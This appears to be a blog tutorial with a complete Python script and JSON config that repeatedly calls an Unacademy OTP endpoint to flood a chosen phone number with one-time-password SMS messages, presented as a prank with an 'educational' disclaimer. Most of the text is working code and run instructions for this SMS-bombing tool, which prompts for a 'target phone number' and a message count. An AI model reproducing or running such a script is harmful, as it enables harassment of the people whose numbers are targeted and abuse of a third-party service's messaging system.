## Introduction

In this article, we'll delve into a Python script that adds a touch of humor to your day by sending **unlimited Unacademy OTPs** to your friends' mobile numbers. However, it's crucial to stress that the primary purpose of this script is educational, and any misuse or harm is strongly discouraged.

## Prerequisite

Before we jump into the script, ensure that you have Python and pip installed on your system. You should also have a basic understanding of Python programming. There's no need for any third-party dependencies for this project; all you require is your setup and the provided script.

## Getting Started

1. Begin by creating a folder named "Script" in your preferred location.
2. Within the "Script" folder, craft three files:

   - main.py
   - data.json
   - requirements.txt

3. In the "requirements.txt" file, insert the following line:

```typescript
requests
```

4. In the "data.json" file, paste the following code:

```json
[
  {
    "name": "UNACADEMY",
    "url": "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
    "headers": {},
    "body": {
      "phone": "",
      "country_code": "IN",
      "otp_type": 1,
      "email": "",
      "send_otp": true,
      "is_un_teach_user": false
    }
  }
]
```

**Note**: You can update the "country_code" to match your country's ID.

5. In the "main.py" file, paste the Python script provided:

```python
import requests
import json
import time


def send_requests(index, data, mobile_number):
    for obj in data:
        name = obj["name"]
        url = obj["url"]
        headers = obj["headers"]
        payload = obj["body"]

        # Update payload with the mobile number
        for key in payload.keys():
            if key in keys_to_update:
                payload[key] = mobile_number

        response = requests.post(url, headers=headers, json=payload)

        # Check the response status code
        if response.status_code == 200:
            message = json.loads(response.text)
            print(f"{index+1} => {name}: {message['message']}")
        else:
            print(f"{name}: Request failed with status code {response.status_code}")

        # Add a 1-minute delay between requests
        time.sleep(60)


if __name__ == "__main__":
    # Fetch mobile number from the user
    mobile_number = input("Please Enter Phone Number: ")
    count = int(input("Please Enter Message count: "))

    # Opening JSON file
    with open("data.json") as f:
        data = json.load(f)

    # Keys to update in Payload
    keys_to_update = ["phone"]

    for index in range(count):
        # Send requests
        send_requests(index, data, mobile_number)
```

## Running the Script

Now, follow these commands to execute the script:

```python
# Create a virtual environment
python3 -m venv .venv

# Activate the virtual environment (Linux/Mac)
source .venv/bin/activate

# Activate the virtual environment (Windows)
.venv\Scripts\activate

# Install dependencies
pip3 install -r requirements.txt

# Run the Python script
python3 main.py
```

> After executing the script, you will be prompted to **enter the target phone number and number of OTP's you want to send**. Enter details, Press enter. And within 5 seconds, you will receive Unacademy OTP's.

## Important Note

At the time of writing this article, there are no restrictions number of OTP's but we can send one OTP each minute. You have the freedom to send as many OTPs as you desire to play pranks on your friends. However, it's important to note that the situation may change in the future, so be sure to check for any updates if you're reading this at a later date.

## Conclusion

This Python script serves as an educational tool and a lighthearted way to explore programming. Always exercise responsible and ethical coding practices. Enjoy your Unacademy OTP prank responsibly and respect the privacy and consent of others.
